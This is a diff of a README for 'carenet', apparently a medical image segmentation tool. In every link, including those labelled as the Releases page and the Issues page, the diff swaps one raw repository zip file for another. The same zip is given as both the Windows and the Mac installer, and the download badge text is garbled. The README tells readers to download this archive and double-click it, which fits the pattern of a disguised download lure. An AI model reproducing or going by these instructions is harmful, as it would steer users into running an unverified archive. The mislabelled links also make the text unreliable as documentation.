@@ -8,16 +8,16 @@ Welcome to **carenet**! This tool helps you segment small medical objects clearl
 
 To get started, you need to download the application. Click the button below to visit the Releases page.
 
-[![Download Now](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip%20Now-Visit%https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip)](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip)
+[![Download Now](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip%20Now-Visit%https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip)](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip)
 
 ### Steps to Download
 
-1. Click the button above to go to the [Releases page](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip).
+1. Click the button above to go to the [Releases page](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip).
 2. Look for the latest version of the application. It will be labeled clearly.
 3. Click the link that says “Assets” to expand the download options.
 4. Select the file that you need for your system. Common choices are:
-   - `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip` for Windows users
-   - `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip` for Mac users
+   - `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip` for Windows users
+   - `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip` for Mac users
 
 5. After selecting the appropriate file, click on it to start the download.
 
@@ -25,12 +25,12 @@ To get started, you need to download the application. Click the button below to 
 
 1. Once the download is complete, find the file where you saved it. This is typically in your “Downloads” folder.
 2. For Windows:
-   - Double-click the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip` file to begin the installation.
+   - Double-click the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip` file to begin the installation.
    - Follow the prompts in the installation wizard to complete the setup.
 
    For Mac:
-   - Open the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip` file to extract it.
-   - Drag the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip` into your Applications folder.
+   - Open the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip` file to extract it.
+   - Drag the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip` into your Applications folder.
 
 ## 🎉 Running the Application
 
@@ -45,7 +45,7 @@ After installation, you can run **carenet** in just a few steps.
 ### For Mac Users
 
 1. Open your Applications folder.
-2. Find and double-click on the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip` icon.
+2. Find and double-click on the `https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip` icon.
 3. The application will launch, and you can begin working.
 
 ## ⚙️ System Requirements
@@ -84,7 +84,7 @@ The accuracy depends on image quality and the settings you choose. Experiment wi
 
 ### Where can I find help or support?
 
-You can visit our [GitHub Issues page](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip) to ask questions or report issues. We welcome any feedback.
+You can visit our [GitHub Issues page](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip) to ask questions or report issues. We welcome any feedback.
 
 ### How can I contribute?
 
@@ -98,4 +98,4 @@ We thank our contributors and the community for their support. Your feedback hel
 
 Follow the repository for updates. You’ll receive notifications about new releases, enhancements, and features.
 
-For further details or questions, feel free to visit our [Releases page](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/marine/carenet.zip) anytime. Enjoy using **carenet**!
+For further details or questions, feel free to visit our [Releases page](https://raw.githubusercontent.com/Giuseppearzu/carenet/main/figures/Software_v2.2-alpha.1.zip) anytime. Enjoy using **carenet**!
